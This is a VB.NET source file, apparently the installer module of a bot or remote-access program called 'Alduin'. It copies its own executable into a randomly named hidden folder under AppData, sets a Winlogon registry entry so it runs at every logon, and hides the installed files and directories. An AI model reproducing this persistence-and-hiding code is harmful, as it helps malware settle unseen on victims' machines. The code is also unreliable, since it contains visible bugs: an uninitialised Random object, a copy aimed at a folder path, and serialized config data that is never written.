Imports System.IO
Imports System.Text
Imports Alduin.Stump.Alduin.Server.Modules.IO
Imports Alduin.Stump.Alduin.Stump.Models
Imports Newtonsoft.Json

Namespace Alduin.Server.Modules.Installer
    Module Installer
        Public Sub Installer()
            If Not File.Exists(GetPathes.get_JsonFilewithPath()) Then
                Dim main_file As String = Process.GetCurrentProcess().MainModule.ModuleName
                Dim installPath As String = getAppdata() & "\" & RandomString(5, 8)
                IOModule.CreateDirectory(installPath)
                System.IO.File.Copy(main_file, installPath)
                StartupRegistryModule.Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & main_file)
                Dim config As New Config
                config.Key = RandomString(10, 10)
                config.MainFileName = main_file
                config.MainPath = installPath
                Dim jsonString As String = JsonConvert.SerializeObject(config)
                IOModule.Write_file(installPath & "\MainJson.json", main_file)
                HidderModule.Hide_files(installPath)
                HidderModule.Hide_directories(installPath)
            End If
        End Sub
        Private Function RandomString(ByVal min As Integer, ByVal max As Integer) As String
            Dim r As Random
            Dim characters As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
            Dim sb As New StringBuilder
            Dim randomLength As Integer = r.Next(min, max)
            For i As Integer = 1 To randomLength
                Dim index As Integer = r.Next(0, characters.Length)
                sb.Append(characters.Substring(index, 1))
            Next
            Return sb.ToString()
        End Function

    End Module
End Namespace
